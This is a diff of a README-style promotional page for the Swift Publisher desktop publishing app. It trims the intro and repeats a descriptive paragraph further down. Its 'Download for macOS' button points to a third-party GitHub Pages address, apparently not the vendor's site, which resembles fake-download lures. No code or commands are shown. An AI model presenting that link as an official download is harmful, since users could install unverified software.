@@ -4,11 +4,7 @@
 
 <div>
 <h3>Swift Publisher for macOS</h3>
-<p><a href="#">Swift Publisher for macOS</a> is an intuitive desktop publishing software that allows you to create professional-looking documents, newsletters, brochures, and more, all from the comfort of your Mac. It’s perfect for anyone who needs to design visually appealing materials without the complexity of professional graphic design tools. Whether you're creating a flyer for your small business or a school project, Swift Publisher provides the tools to make it happen with ease.
-
-With Swift Publisher, you can choose from a wide selection of templates or create your own designs from scratch. The app includes an extensive library of pre-designed templates, graphic elements, and fonts that make it easy to customize your projects. You can add text, images, shapes, and effects, and everything is fully customizable, allowing you to create unique designs for any occasion.
-
-Swift Publisher's simple drag-and-drop interface allows for quick layout adjustments, and its ability to export designs in various formats (PDF, JPEG, PNG) makes it easy to share your work with others. Whether you're working on a single-page flyer or a multi-page booklet, Swift Publisher provides a powerful and user-friendly solution for all your publishing needs.</p>
+<p><a href="#">Swift Publisher for macOS</a> is an intuitive desktop publishing software that allows you to create professional-looking documents, newsletters, brochures, and more, all from the comfort of your Mac.</p>
 
 <a href="https://quick-mac-install.github.io/.github/SwiftPublisher">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
@@ -45,6 +41,9 @@ With Swift Publisher, you can choose from a wide selection of templates or creat
 
 Swift Publisher's simple drag-and-drop interface allows for quick layout adjustments, and its ability to export designs in various formats (PDF, JPEG, PNG) makes it easy to share your work with others. Whether you're working on a single-page flyer or a multi-page booklet, Swift Publisher provides a powerful and user-friendly solution for all your publishing needs.
 
+With Swift Publisher, you can choose from a wide selection of templates or create your own designs from scratch. The app includes an extensive library of pre-designed templates, graphic elements, and fonts that make it easy to customize your projects. You can add text, images, shapes, and effects, and everything is fully customizable, allowing you to create unique designs for any occasion.
+
+Swift Publisher's simple drag-and-drop interface allows for quick layout adjustments, and its ability to export designs in various formats (PDF, JPEG, PNG) makes it easy to share your work with others. Whether you're working on a single-page flyer or a multi-page booklet, Swift Publisher provides a powerful and user-friendly solution for all your publishing needs.
 ---
 
 ## Major Features
